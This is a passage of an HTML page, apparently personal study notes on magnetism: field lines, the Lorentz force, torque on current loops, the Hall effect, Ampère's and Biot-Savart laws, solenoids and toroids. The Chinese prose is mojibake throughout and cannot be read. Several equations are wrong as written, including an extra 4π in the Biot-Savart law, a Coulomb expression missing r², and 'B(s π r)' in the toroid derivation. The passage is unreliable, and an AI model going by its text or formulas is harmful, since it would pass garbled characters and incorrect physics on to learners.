ä¸å®¹æ˜“è¢«ç£åŒ–çš„ç‰©è´¨ï¼Œå…¶å†…éƒ¨çš„åŸå­éš¾ä»¥å—å¤–éƒ¨ç£åœºçš„å½±å“è€Œæ’åˆ—æ•´é½.</p><p>ç£åŠ›çš„å­˜åœ¨æ˜¯ç”±äºç£åœº.</p><h4 id="å‚è€ƒ-YouTube"><a href="#å‚è€ƒ-YouTube" class="headerlink" title="å‚è€ƒ YouTube"></a><a href="https://www.youtube.com/watch?v=MRqQQGO7Xe8">å‚è€ƒ YouTube</a></h4><p>è´¨å­å’Œç”µå­çš„è‡ªæ—‹:<br><img src="/../img/self_rotate_of_proton_and_electron.png"></p><p>è‡ªæ—‹å’Œç”µå­ç»•æ ¸æ—‹è½¬éƒ½ä¼šäº§ç”Ÿç”µæµ:<br><img src="/../img/current_made_by_self_rotate_indecate_mag.png"></p><p>å¦‚è¿™å¼ å›¾ï¼Œè¿™ä¸‰ä¸ªç£åœºå‘é‡åˆå‘é‡å°±æ˜¯è¿™ä¸ªç²’å­çš„ç£åœºæ–¹å‘.</p><h5 id="åŒä¸€æ–¹å‘"><a href="#åŒä¸€æ–¹å‘" class="headerlink" title="åŒä¸€æ–¹å‘"></a>åŒä¸€æ–¹å‘</h5><p>å¦‚æœæ‰€æœ‰çš„ç²’å­çš„ç£åœºå‘é‡éƒ½ä½äºä¸€ä¸ªæ–¹å‘:<br><img src="/../img/vector_in_the_same_direction.png"></p><p>é‚£ä¹ˆå…¶åˆå‘é‡å°±å¾ˆå¤§. ç‰©ä½“å°±ä¼šè¡¨ç°å‡ºç£æ€§.</p><h5 id="ä¸åŒæ–¹å‘"><a href="#ä¸åŒæ–¹å‘" class="headerlink" title="ä¸åŒæ–¹å‘"></a>ä¸åŒæ–¹å‘</h5><p>å¦‚æœå„ä¸ªç²’å­çš„å‘é‡æ–¹å‘ä¸åŒï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ç‹ å¤šè¢«æŠµæ¶ˆæ‰:<br><img src="/../img/vectors_in_different_direction.png"></p><p>ç‰©ä½“çš„ç£æ€§å°±ä¸ä¼šè¡¨ç°å‡º.</p><h5 id="æ–½åŠ å¤–éƒ¨ç£åœº"><a href="#æ–½åŠ å¤–éƒ¨ç£åœº" class="headerlink" title="æ–½åŠ å¤–éƒ¨ç£åœº"></a>æ–½åŠ å¤–éƒ¨ç£åœº</h5><p>æ–½åŠ ä¸€ä¸ªå¤–éƒ¨ç£åœºï¼Œå¯èƒ½ä½¿ç‰©ä½“å†…ç²’å­äº§ç”Ÿçš„ç£åœºå‘é‡æ–¹å‘æ’åˆ—æ•´é½ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé“å—åœ¨é ç»ä¸€å—ç£é“ä½¿å°±å…·æœ‰äº†ç£æ€§:</p><p><img src="/../img/outer_magnetic_field_adjust_the_vectors_direction.png"></p><h5 id="ç›¸å…³æ•°å­¦å…¬å¼"><a href="#ç›¸å…³æ•°å­¦å…¬å¼" class="headerlink" title="ç›¸å…³æ•°å­¦å…¬å¼"></a>ç›¸å…³æ•°å­¦å…¬å¼</h5><p><img src="/../img/related_mathmatic_equations_in_why_there_is_a_magnetism.png"></p><h3 id="ç£åœºçº¿"><a href="#ç£åœºçº¿" class="headerlink" title="ç£åœºçº¿"></a>ç£åœºçº¿</h3><p><mark>æ–¹å‘çš„å®šä¹‰</mark>:</p><p>ç£åœºçº¿çš„æ–¹å‘æ˜¯åœ¨ç£åœºä¸­ï¼Œå°ç£é’ˆ N æè½¬åŠ¨çš„æ–¹å‘.</p><p>ç£åœºçº¿çš„å¯†é›†ç¨‹åº¦å’Œç£åœºå¼ºåº¦æˆæ­£æ¯”.</p><p>åœ¨ç£é“å¤–éƒ¨ï¼Œç£åœºçº¿æ€»æ˜¯ä» N æå‘å‡ºå¹¶å›åˆ° S æ. ä¸”å§‹ç»ˆæ˜¯ä¸€ä¸ªé—­åˆçš„æ›²çº¿.<br><img src="/../img/magnetic_filed_line_direction.png"></p><p>å½¢æˆå®Œç¾çš„ uniform field çš„å¹¶ä¸å®¹æ˜“ï¼Œä½†æ˜¯å½“:</p><ul><li>ç£æè¡¨é¢è¿œå¤§äºä¸¤ä¸ªç£æä¹‹é—´çš„è·ç¦»</li></ul><p>å¯ä»¥è¿‘ä¼¼å¾—åˆ°ä¸€ä¸ª uniform field.<br><img src="/../img/magnetic_field_beteewn_two_large_face.png"></p><h2 id="25-2-ç”µç”Ÿç£-Electric-Currents-Produce-Magnetism"><a href="#25-2-ç”µç”Ÿç£-Electric-Currents-Produce-Magnetism" class="headerlink" title="25-2 ç”µç”Ÿç£ Electric Currents Produce Magnetism"></a>25-2 ç”µç”Ÿç£ Electric Currents Produce Magnetism</h2><p>ç”¨å³æ‰‹å®šåˆ™æ ¹æ®ç”µæµçš„æ–¹å‘åˆ¤æ–­ç”Ÿæˆçš„ç£åœºçš„æ–¹å‘.</p><p>æœ‰ä¸¤ç§æƒ…å†µ:</p><ul><li>electric current in a straight wire</li><li>a circular loop of wire</li></ul><p><img src="/../img/right_hand_rule_determine_the_direction_of_magnetic_field.png"></p><h2 id="25-3-åœ¨ç£åœºä¸­ç”µæµæ‰€å—åˆ°çš„åŠ›-B-çš„å®šä¹‰-Force-on-an-Electric-Current-in-a-Magnetic-Field-Definition-of-B"><a href="#25-3-åœ¨ç£åœºä¸­ç”µæµæ‰€å—åˆ°çš„åŠ›-B-çš„å®šä¹‰-Force-on-an-Electric-Current-in-a-Magnetic-Field-Definition-of-B" class="headerlink" title="25-3 åœ¨ç£åœºä¸­ç”µæµæ‰€å—åˆ°çš„åŠ›; B çš„å®šä¹‰ Force on an Electric Current in a Magnetic Field; Definition of B"></a>25-3 åœ¨ç£åœºä¸­ç”µæµæ‰€å—åˆ°çš„åŠ›; B çš„å®šä¹‰ Force on an Electric Current in a Magnetic Field; Definition of B</h2><p>ä»å°ç£é’ˆè½¬åŠ¨å¯ä»¥çŸ¥é“ï¼Œå…¶å—åˆ°äº†ä¸€å®šåŠ›çš„ä½œç”¨.</p><p>åŠ›çš„æ–¹å‘ä¸ç”µæµæ–¹å‘å’Œç£åœºæ–¹å‘éƒ½å‚ç›´, ä¹Ÿå¯ä»¥ç”¨å³æ‰‹å®šåˆ™åˆ¤æ–­, æ‹‡æŒ‡æ–¹å‘ä¸ºåŠ›çš„æ–¹å‘:</p><p><img src="/../img/right_hand_rule_the_direction_of_force.png"></p><blockquote><p>è®¡ç®—å…¬å¼æ¨å¯¼</p></blockquote><p>é¦–å…ˆæœ‰è§‚å¯Ÿåˆ°è¿™æ ·ä¸€ä¸ªå…³ç³»:<br>$$<br>F \propto IlB \sin \theta<br>$$<br>ç„¶å:<br>$$<br>\displaylines{F &#x3D; IlB \sin \theta \newline~ \newline F &#x3D; Il \times B}<br>$$<br>åè€…ä¸ºå‘é‡å½¢å¼ï¼Œ $l$ å’Œ $B$ æ˜¯å‘é‡ã€‚å’Œ $\sin$ ç›¸å…³çš„éƒ½å¯ä»¥æ”¹ä¸ºå‰ä¹˜ï¼Œä¸”å¯ä»¥ç”¨å³æ‰‹å®šåˆ™åˆ¤æ–­æ–¹å‘.</p><p>æ›´åŠ é€šç”¨çš„å½¢å¼:<br>$$<br>dF &#x3D; I dl \times B<br>$$</p><h3 id="B-çš„å®šä¹‰"><a href="#B-çš„å®šä¹‰" class="headerlink" title="B çš„å®šä¹‰"></a>B çš„å®šä¹‰</h3><p>å¯ä»¥çœ‹ä½œæ˜¯ç£æ„Ÿçº¿çš„å¯†é›†ç¨‹åº¦ï¼Œå•ä½é¢ç§¯ç©¿è¿‡çš„ç£æ„Ÿçº¿æ•°é‡. å…¶å¤§å°åœ¨ 26 ç« æè¿°</p><p>SI å•ä½æ˜¯ Tesla (T), $T &#x3D; 1N&#x2F;A \cdot m$.</p><p>åœ°çƒè¡¨é¢çš„ç£åœºå¼ºåº¦ä¸º $0.5 \times 10^{-4}T$.</p><p>ä¸¤ä¸ªè¡¨ç¤º B æ–¹å‘çš„ç¬¦å·:</p><blockquote><p>å‘å¤– point out</p></blockquote><p><img src="/../img/magnetic_field_point_out.png"></p><blockquote><p>å‘é‡Œ point inward</p></blockquote><p><img src="/../img/magnetic_filed_point_inward.png"></p><h2 id="25-4-åœ¨ç£åœºä¸­ç§»åŠ¨çš„ç”µå­å—åˆ°çš„åŠ›-Force-on-an-Electric-Charge-Moving-in-a-Magnetic-Field"><a href="#25-4-åœ¨ç£åœºä¸­ç§»åŠ¨çš„ç”µå­å—åˆ°çš„åŠ›-Force-on-an-Electric-Charge-Moving-in-a-Magnetic-Field" class="headerlink" title="25-4 åœ¨ç£åœºä¸­ç§»åŠ¨çš„ç”µå­å—åˆ°çš„åŠ› Force on an Electric Charge Moving in a Magnetic Field"></a>25-4 åœ¨ç£åœºä¸­ç§»åŠ¨çš„ç”µå­å—åˆ°çš„åŠ› Force on an Electric Charge Moving in a Magnetic Field</h2><blockquote><p>å…¬å¼æ¨å¯¼, å·²çŸ¥åœ¨æ—¶é—´ t å†…ç©¿è¿‡ N ä¸ªå¸¦ç”µé‡ä¸º q çš„ç²’å­<br>$$<br>\displaylines{I &#x3D; \frac{Nq}{t} \newline~ \newline l &#x3D; vt \newline~ \newline F &#x3D; Il \times B \newline~ \newline F &#x3D; \frac{Nq}{t} vt \times B \newline~ \newline F &#x3D; Nqv \times B}<br>$$<br>é‚£ä¹ˆä¸€ä¸ªç²’å­å—åˆ°çš„åŠ›å°±ä¸º:<br>$$<br>F &#x3D; qv \times B<br>$$</p></blockquote><blockquote><p>åŠ›çš„æ–¹å‘åˆ¤æ–­, è¿™é‡Œçš„ $v$ æ˜¯ç²’å­è¿åŠ¨æ–¹å‘, å› æ­¤ç”¨å³æ‰‹å®šåˆ™åˆ¤æ–­ </p></blockquote><p>æ‹‡æŒ‡æ–¹å‘ä¸ºåŠ›çš„æ–¹å‘, å››æŒ‡ä¸ºç²’å­è¿åŠ¨æ–¹å‘ (ä¸æ˜¯ç”µæµæ–¹å‘). æ³¨æ„ç²’å­çš„ç”µæ€§ä¼šå½±å“æœ€ç»ˆçš„ç»“æœ.</p><p><img src="/../img/direction_of_force_when_there_is_a_charge.png"></p><h3 id="åœ¨å‡åŒ€ç£åœºä¸­"><a href="#åœ¨å‡åŒ€ç£åœºä¸­" class="headerlink" title="åœ¨å‡åŒ€ç£åœºä¸­"></a>åœ¨å‡åŒ€ç£åœºä¸­</h3><p>åšåŒ€é€Ÿåœ†å‘¨è¿åŠ¨ï¼Œä¸”ä¸åšåŠŸ (åŠ›çš„æ–¹å‘å’Œè¿åŠ¨æ–¹å‘å‚ç›´)</p><p><img src="/../img/uniform_circle_move_of_charge_in_uniform_magnetic_field.png"></p><blockquote><p>ç»“åˆåœ†å‘¨è¿åŠ¨çš„ç›¸å…³å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{F &#x3D; ma \newline~ \newline a &#x3D; \frac{v^2}{r} \newline~ \newline F &#x3D; qvB &#x3D; \frac{mv^2}{r} \newline~ \newline r &#x3D; \frac{mv}{qB} \newline~ \newline T &#x3D; \frac{2 \pi r}{v} \newline~ \newline T &#x3D; \frac{2 \pi m}{qB}}<br>$$</p><p>å½“é€Ÿåº¦æ–¹å‘å’Œç£åœºæ–¹å‘ä¸å‚ç›´æ—¶çš„è·¯å¾„ä¸º Spiral Path:<br><img src="/../img/spiral_path_when_velocity_not_perpendicular_to_magnetic_field.png"></p><h3 id="åŒæ—¶ä½äºç£åœºå’Œç”µåœºä¸­"><a href="#åŒæ—¶ä½äºç£åœºå’Œç”µåœºä¸­" class="headerlink" title="åŒæ—¶ä½äºç£åœºå’Œç”µåœºä¸­"></a>åŒæ—¶ä½äºç£åœºå’Œç”µåœºä¸­</h3><p>Lorentz equation:</p><p>$$<br>F &#x3D; q(E + v \times B)<br>$$</p><h2 id="25-5-ç¯å½¢ç”µè·¯ä¸­çš„åŠ›çŸ©-ç£å¶çŸ©-Torque-on-a-Current-Loop-Magnetic-Dipole-Moment"><a href="#25-5-ç¯å½¢ç”µè·¯ä¸­çš„åŠ›çŸ©-ç£å¶çŸ©-Torque-on-a-Current-Loop-Magnetic-Dipole-Moment" class="headerlink" title="25-5 ç¯å½¢ç”µè·¯ä¸­çš„åŠ›çŸ©; ç£å¶çŸ© Torque on a Current Loop; Magnetic Dipole Moment"></a>25-5 ç¯å½¢ç”µè·¯ä¸­çš„åŠ›çŸ©; ç£å¶çŸ© Torque on a Current Loop; Magnetic Dipole Moment</h2><p>è§‚å¯Ÿè¿™å¹…å›¾, å…¶ä¸­ <img src="/../img/magnetic_field_point_out.png"> å’Œ <img src="/../img/magnetic_filed_point_inward.png"> æ˜¯åŠ›çš„æ–¹å‘, è¿™é‡Œçš„ torque ä¹Ÿæ˜¯ç”µå‹è¡¨ç­‰å™¨ææŒ‡é’ˆè½¬åŠ¨çš„åŸç†:</p><p><img src="/../img/torque_on_a_current_loop.png"></p><blockquote><p>å…¬å¼æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{\tau &#x3D; l_1 \times F  \newline~ \newline l_1 &#x3D; \frac{b}{2} \newline~ \newline F &#x3D; Il_2 \times B \newline~ \newline l_2 &#x3D; a \newline~ \newline \tau &#x3D; \frac{b}{2} I a B + \frac{b}{2} I a B &#x3D; Iab B \newline~ \newline A &#x3D; ab \newline~ \newline \tau &#x3D; IA B}<br>$$<br>å¯ä»¥çœ‹å‡º $ab$ æ˜¯çº¿åœˆçš„é¢ç§¯. å¦‚æœçº¿åœˆæœ‰ N è½§:<br>$$<br>\tau &#x3D; N IA B &#x3D; N IA B<br>$$</p><p>å¦‚æœçº¿åœˆå’Œç£åœºä¸æ˜¯å‚ç›´çš„ï¼Œç£åœºå¼ºåº¦ B ä¼šå˜åŒ–å¦‚:<br><img src="/../img/not_perpendicular_the_magnetic_field_and_current_loop.png"></p><p>æ­¤æ—¶ $\tau$ å˜ä¸º:<br>$$<br>\tau &#x3D; NIAB \sin \theta<br>$$<br>$\theta$ ä¸ºå°è§’ ( $0^\circ ~ 90^\circ$ ).</p><p>ä¸ºäº†å°† $\tau$ çš„è®¡ç®—å¼å†™æˆä¸¤ä¸ªç‰©ç†é‡ç›¸ä¹˜çš„å½¢å¼, å®šä¹‰äº†ä¸€ä¸ªç‰©ç†é‡ <mark>magnetic dipole moment ç”µå¶çŸ©</mark>:<br>$$<br>\mu &#x3D; NIA<br>$$</p><p>æœ€ç»ˆï¼Œtorque çš„è¡¨è¾¾å¼å¯ä»¥å†™ä¸º:<br>$$<br>\tau &#x3D; \mu \times B<br>$$</p><p>åˆ©ç”¨ $\tau$ å’Œ è§’åº¦ $\theta$ è®¡ç®—åšåŠŸä¸º:<br>$$<br>U &#x3D; \int \tau d\theta &#x3D; \int NIAB \sin \theta d\theta &#x3D; -\mu B \cos \theta + C<br>$$</p><p>ä¸€èˆ¬æˆ‘ä»¬é€‰å– $\theta &#x3D; 90^\circ$ ä¹Ÿå°±æ˜¯ç£åœºå’Œçº¿åœˆå‚ç›´ä¸ºåˆå§‹ç‚¹ï¼Œå³ $U &#x3D; 0$, å°±å¯ä»¥ç®—å‡º:<br>$$<br>\displaylines{U &#x3D; 0 &#x3D; -\mu B \cos \theta + C &#x3D; 0 + C \newline~ \newline C &#x3D; 0 \newline~ \newline \therefore  U &#x3D; -\mu B \cos \theta &#x3D; -u \cdot B}<br>$$</p><h2 id="25-8-éœå°”æ•ˆåº”-The-Hall-Effect"><a href="#25-8-éœå°”æ•ˆåº”-The-Hall-Effect" class="headerlink" title="25-8 éœå°”æ•ˆåº” The Hall Effect"></a>25-8 éœå°”æ•ˆåº” The Hall Effect</h2><p>The Hall Effect æè¿°äº†ï¼Œå½“ä¸€ä¸ªç”µå­åœ¨å­˜åœ¨ç£åœºå’Œç”µåœºçš„ç¯å¢ƒä¸‹è¿åŠ¨æ—¶ï¼Œå…¶é€Ÿåº¦åˆ°è¾¾ä¸€å®šå€¼ï¼Œä½¿å¾—ç”µåœºåŠ›å’Œæ´›ä¼¦å…¹åŠ›ç›¸ç­‰.</p><p>$$<br>\displaylines{F &#x3D; eE \newline~ \newline F &#x3D; ev \times B \newline~ \newline eE &#x3D; evB \newline~ \newline E &#x3D; vB}<br>$$</p><p>æ­¤æ—¶çš„ç”µåŠ¿å·®è¢«ç§°ä¸º Hall emf ($\xi$):<br>$$<br>\displaylines{\xi &#x3D; El &#x3D; vBl}<br>$$</p><p><img src="/../img/Hall_Effect.png"></p><h1 id="Chapter-26-ç£åœºçš„æº-Source-of-Magnetic-Field"><a href="#Chapter-26-ç£åœºçš„æº-Source-of-Magnetic-Field" class="headerlink" title="Chapter 26 ç£åœºçš„æº Source of Magnetic Field"></a>Chapter 26 ç£åœºçš„æº Source of Magnetic Field</h1><h2 id="26-1-Magnetic-Field-Due-to-a-Straight-Wire"><a href="#26-1-Magnetic-Field-Due-to-a-Straight-Wire" class="headerlink" title="26-1 Magnetic Field Due to a Straight Wire"></a>26-1 Magnetic Field Due to a Straight Wire</h2><p>å®éªŒè§‚å¯Ÿå‡ºçš„ç°è±¡:<br>$$<br>\displaylines{B \propto \frac{I}{r}}<br>$$<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œç”µæµè¶Šå¤§ï¼Œå…¶äº§ç”Ÿçš„ç£åœºè¶Šå¤§ï¼Œç¦»ç”µæµè¶Šè¿œï¼Œç£åœºè¶Šå°.</p><p><img src="/../img/Stright_wire_generate_megnetic_field.png"><br>åœ¨è¿™ç§ Straight Wire äº§ç”Ÿçš„ç£åœºï¼Œå…¶è®¡ç®—å…¬å¼ä¸º (é€šç”¨è®¡ç®—å¼è¦ç»“åˆåé¢çš„ Ampereâ€™s law):<br>$$<br>\displaylines{B &#x3D; \frac{\mu_0}{2 \pi} \frac{I}{r}}<br>$$</p><p>å…¶ä¸­ $\mu_0$ æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œç§°ä¸º permeability of free space, å€¼ä¸º $4 \pi \times 10^{-7} T \cdot m&#x2F;A$</p><h2 id="26-2-ä¸¤ä¸ªå¹³è¡Œå¯¼çº¿é—´çš„åŠ›-Force-between-Two-Parallel-Wires"><a href="#26-2-ä¸¤ä¸ªå¹³è¡Œå¯¼çº¿é—´çš„åŠ›-Force-between-Two-Parallel-Wires" class="headerlink" title="26-2 ä¸¤ä¸ªå¹³è¡Œå¯¼çº¿é—´çš„åŠ› Force between Two Parallel Wires"></a>26-2 ä¸¤ä¸ªå¹³è¡Œå¯¼çº¿é—´çš„åŠ› Force between Two Parallel Wires</h2><p><img src="/../img/two_parallel_wire_produce_magnetic_field.png"></p><p>æ–½åŠ çš„åŠ›å¤§å°ç›¸ç­‰æ–¹å‘ç›¸å.</p><blockquote><p>å…¬å¼æ¨å¯¼<br>$$<br>\displaylines{B_1 &#x3D; \frac{\mu_0}{2 \pi} \frac{I_1}{r} \newline~ \newline F &#x3D; I_2B_1l &#x3D; \frac{F}{l} &#x3D; \frac{\mu_0}{2 \pi} \frac{I_1 I_2}{d}}<br>$$</p></blockquote><h2 id="26-3-å®‰åŸ¹å’Œåº“ä»‘çš„å®šä¹‰-Operational-Definition-of-the-Ampere-and-the-Coulomb"><a href="#26-3-å®‰åŸ¹å’Œåº“ä»‘çš„å®šä¹‰-Operational-Definition-of-the-Ampere-and-the-Coulomb" class="headerlink" title="26-3 å®‰åŸ¹å’Œåº“ä»‘çš„å®šä¹‰ Operational Definition of the Ampere and the Coulomb"></a>26-3 å®‰åŸ¹å’Œåº“ä»‘çš„å®šä¹‰ Operational Definition of the Ampere and the Coulomb</h2><h2 id="26-4-Ampereâ€™s-Law"><a href="#26-4-Ampereâ€™s-Law" class="headerlink" title="26-4 Ampereâ€™s Law"></a>26-4 Ampereâ€™s Law</h2><p><img src="/../img/magnetic_field_with_irregular_shape.png"></p><p>Ampereâ€™s law è¿ç”¨ç§¯åˆ†çš„æ¦‚å¿µï¼Œå°†è·¯å¾„åˆ’åˆ†ä¸ºæå°ä»½ï¼Œç„¶åç›¸åŠ å¾—åˆ°:<br>$$<br>\displaylines{\sum B \Delta l &#x3D; \mu_0 I_{encl} \newline~ \newline \int B \cdot dl &#x3D; \mu_0 I_{encl}}<br>$$<br>è¿™é‡Œæ¯ä¸€ç‚¹çš„ B éƒ½ä¸ç›¸åŒï¼Œå› æ­¤ä¸»è¦æ˜¯é å³å¼è®¡ç®—. ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œå…¶å®å’Œé«˜æ–¯å®šç†ä¸€æ ·ï¼Œé€‰å–åˆé€‚çš„è·¯å¾„å³å¯è®¡ç®—ï¼Œä¸€èˆ¬é€‰å–åœ†ï¼Œä¸Šè¿°å›¾å½¢çš„è®¡ç®—å…¶å®å’Œä¸‹é¢ä¸€æ ·.<br><img src="/../img/chose_a_path_for_ampere_law.png"><br>æ­¤æ—¶å†å›å¤´æ¨å¯¼ä¹‹å‰è®¡ç®— Straight Wire äº§ç”Ÿçš„ç£åœºå¼ºåº¦.</p><blockquote><p>æ¨å¯¼è¿‡ç¨‹</p></blockquote><p>$$<br>\displaylines{\int B \cdot dl &#x3D; B \int dl &#x3D; B(2 \pi r) &#x3D; \mu_0 I_{encl} \newline~ \newline B &#x3D; \frac{\mu_0 I}{2 \pi r}}<br>$$</p><h2 id="26-5-èºçº¿ç®¡å’Œç¯å½¢çº¿åœˆäº§ç”Ÿçš„ç£åœº-Magnetic-Field-of-a-Solenoid-and-a-Toroid"><a href="#26-5-èºçº¿ç®¡å’Œç¯å½¢çº¿åœˆäº§ç”Ÿçš„ç£åœº-Magnetic-Field-of-a-Solenoid-and-a-Toroid" class="headerlink" title="26-5 èºçº¿ç®¡å’Œç¯å½¢çº¿åœˆäº§ç”Ÿçš„ç£åœº Magnetic Field of a Solenoid and a Toroid"></a>26-5 èºçº¿ç®¡å’Œç¯å½¢çº¿åœˆäº§ç”Ÿçš„ç£åœº Magnetic Field of a Solenoid and a Toroid</h2><blockquote><p>solenoid ç¤ºæ„å›¾</p></blockquote><p><img src="/../img/solenoid_looks_like.png"></p><p>ä¸€ä¸ªé•¿çº¿ç»•äº†å¾ˆå¤šåœˆ.</p><p>èºçº¿ç®¡å†…éƒ¨çš„ç£åœºè¾ƒå¼ºï¼Œå¤–éƒ¨ç›¸å¯¹äºå†…éƒ¨éå¸¸å° </p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œäº§ç”Ÿå¤–éƒ¨ç£åœºçš„éƒ¨åˆ†ä¸º:<br><img src="/../img/solenoid_create_outside_magnetic_field.png"></p><blockquote><p>å…¬å¼æ¨å¯¼</p></blockquote><p><img src="/../img/magnetic_field_created_by_solenoid.png"></p><p>$$<br>\displaylines{\oint B \cdot dl &#x3D; \int_a^b B \cdot dl + \int_b^c B \cdot dl +\int_c^d B \cdot dl +\int_d^a B \cdot dl \newline~ \newline &#x3D; \int_c^dB \cdot dl \newline~ \newline &#x3D; Bl \newline~ \newline \oint B \cdot dl &#x3D; N \mu_0 I \newline~ \newline Bl &#x3D; N \mu_0 I \newline~ \newline n &#x3D; \frac{N}{l} \newline~ \newline B &#x3D; \mu_0 n I}<br>$$<br>å…¶ä¸­ bc è¾¹å’Œ ad è¾¹æŠµæ¶ˆï¼Œba è¾¹å¤ªå°è€Œè¢«å¿½ç•¥.</p><p>n çš„å•ä½é•¿åº¦çš„åœˆæ•°. å¯ä»¥çœ‹å‡ºï¼Œsolenoid å†…çš„ç£åœºå¼ºåº¦å’Œçº¿åœˆæ•°å’Œç”µæµå¤§å°æœ‰å…³.</p><h3 id="Toroid"><a href="#Toroid" class="headerlink" title="Toroid"></a>Toroid</h3><blockquote><p>Toroid ç¤ºæ„å›¾</p></blockquote><p>å…¶å¤–å½¢åƒæŠŠ solenoid æŠ˜æˆä¸€ä¸ªç¯.<br><img src="/../img/diagram_of_Toroid.png"></p><blockquote><p>å†…éƒ¨ç£åœºå…¬å¼æ¨å¯¼</p></blockquote><p>è¿˜æ˜¯çœ‹ä¸Šé¢é‚£ä¸€å¹…å›¾ï¼Œç»“åˆ Ampereâ€™s law, é€‰å–çš„é¢ä¸º Path1 ç”±è™šçº¿æ ‡è¯†:<br>$$<br>\displaylines{\oint B \cdot dl &#x3D; \mu_0 I_{encl} \newline~ \newline B(s \pi r) &#x3D; \mu_0NI \newline~ \newline B &#x3D; \frac{\mu_0 NI}{2 \pi r}}<br>$$</p><blockquote><p>ç‰¹ç‚¹:</p></blockquote><ul><li>å¤–éƒ¨ç£åœºä¸ºé›¶</li></ul><blockquote><p>æ¨å¯¼</p></blockquote><p>é€‰å–çš„ä¸º Path2, å¯¹äºæ¯ä¸€ä¸ªç¯å¦‚å›¾:<br><img src="/../img/Toroid_same_current_different_direction.png"></p><p>å·¦å³æµè¿‡çš„ç”µæµå¤§å°ç›¸ç­‰ï¼Œæ–¹å‘ç›¸åï¼Œåˆç”µæµå› æ­¤ä¸º 0, ç»“åˆ Ampereâ€™s law:<br>$$<br>\displaylines{\oint B \cdot dl &#x3D; \mu_0 I_{encl} \newline~ \newline B (2 \pi r) &#x3D; 0 \newline~ \newline B &#x3D; 0}<br>$$</p><h2 id="26-6-Biot-Savart-Law"><a href="#26-6-Biot-Savart-Law" class="headerlink" title="26-6 Biot-Savart Law"></a>26-6 Biot-Savart Law</h2><p>ç”¨äºè®¡ç®— $dl$ å³ä¸€å°æ®µç”µæµäº§ç”Ÿçš„ç£åœºå¼ºåº¦. è€Œ Ampereâ€™s law éœ€è¦é—­åˆæ›²çº¿.</p><p>å’Œ Coulombâ€™s Law ç»“åˆè®°å¿†:</p><blockquote><p>Coulombâ€™s law</p></blockquote><p>$$<br>\displaylines{dE &#x3D; \frac{1}{4 \pi \epsilon_0} \frac{dq}{r}}<br>$$</p><blockquote><p>Biot-Savartâ€™s law</p></blockquote><p>$$<br>\displaylines{dB &#x3D; \frac{\mu_0 I}{4 \pi} \frac{dl \times \hat{r}}{4 \pi r^2} \newline~ \newline dB &#x3D; \frac{\mu_0 I dl \sin \theta}{4 \pi r^2} \newline~ \newline B &#x3D; \int dB}<br>$$</p><!-- è¿™åº”è¯¥æ˜¯ Ampere's law çš„å¾®åˆ†å½¢å¼ï¼Œç»“åˆ Ampere's law æ¨å¯¼: --><!-- $$ --><!-- \displaylines{\oint B \cdot dl = B \oint dl = \mu_0 I \newline~ \newline dBdl = } --><!-- $$ --><p><img src="/../img/Biot_Savart_Law_where_is_sine.png"></p><p>æ³¨æ„è¿™æ˜¯ $r^2$, ç»“åˆåº“ä»‘å®šç†è®°å¿†.</p><h2 id="26-8-ç”µç£å’Œèºçº¿ç®¡-Electromagnets-and-Solenoids"><a href="#26-8-ç”µç£å’Œèºçº¿ç®¡-Electromagnets-and-Solenoids" class="headerlink" title="26-8 ç”µç£å’Œèºçº¿ç®¡ Electromagnets and Solenoids"></a>26-8 ç”µç£å’Œèºçº¿ç®¡ Electromagnets and Solenoids</h2><p>å¯ä»¥æŠŠ solenoids è§†ä½œä¸€ä¸ªç£é“, ä¸€ä¾§è¢«çœ‹ä½œæ˜¯ north pole, å¦ä¸€ä¾§ä¸º south pole. </p><h2 id="26-9-ç£æ€§ç‰©è´¨ä¸­çš„ç£åœº-æ»åç°è±¡-Magnetic-Field-in-Magnetic-Materials-Hysteresis"><a href="#26-9-ç£æ€§ç‰©è´¨ä¸­çš„ç£åœº-æ»åç°è±¡-Magnetic-Field-in-Magnetic-Materials-Hysteresis" class="headerlink" title="26-9 ç£æ€§ç‰©è´¨ä¸­çš„ç£åœº; æ»åç°è±¡ Magnetic Field in Magnetic Materials; Hysteresis"></a>26-9 ç£æ€§ç‰©è´¨ä¸­çš„ç£åœº; æ»åç°è±¡ Magnetic Field in Magnetic Materials; Hysteresis</h2><p>åœ¨ä¸€ä¸ª Toroid ä¸­åŠ å…¥é“ä¹‹åï¼Œæ€»çš„ç£åœºå¼ºåº¦ä¸º:<br>$$<br>\displaylines{B_0 &#x3D; \mu_0 n I \newline~ \newline B &#x3D; B_0 + B_M &#x3D; \mu nI}<br>$$<br>(æ¯•ç«ŸåŠ å…¥é“ä¹‹åç£åœºå¼ºåº¦ä¼šå˜å¤§, ä¸”ä¸€èˆ¬æƒ…å†µä¸‹ $B_M &gt;&gt; B_0$)<br>ä¸Šé¢çš„ $\mu$ è¢«ç§°ä¸º magnetic permeability.</p><p>å¯¹äº ferromagnetic (é“ç£) ææ–™è€Œè¨€ï¼Œ $\mu$ è¦è¿œå¤§äº $\mu_0$ ( $\mu_0$ å¦‚ä½•å¾—å‡ºçš„)</p><h1 id="Chapter-27-ç”µç£æ„Ÿåº”å’Œæ³•æ‹‰ç¬¬å®šå¾‹-Electromagnetic-Induction-and-Faradayâ€™s-Law"><a href="#Chapter-27-ç”µç£æ„Ÿåº”å’Œæ³•æ‹‰ç¬¬å®šå¾‹-Electromagnetic-Induction-and-Faradayâ€™s-Law" class="headerlink" title="Chapter 27 ç”µç£æ„Ÿåº”å’Œæ³•æ‹‰ç¬¬å®šå¾‹ Electromagnetic Induction and Faradayâ€™s Law"></a>Chapter 27 ç”µç£æ„Ÿåº”å’Œæ³•æ‹‰ç¬¬å®šå¾‹ Electromagnetic Induction and Faradayâ€™s Law</h1><h2 id="27-1-æ„Ÿåº”ç”µåŠ¨åŠ¿-Induced-EMF"><a href="#27-1-æ„Ÿåº”ç”µåŠ¨åŠ¿-Induced-EMF" class="headerlink" title="27-1 æ„Ÿåº”ç”µåŠ¨åŠ¿ Induced EMF"></a>27-1 æ„Ÿåº”ç”µåŠ¨åŠ¿ Induced EMF</h2><p>Faraday 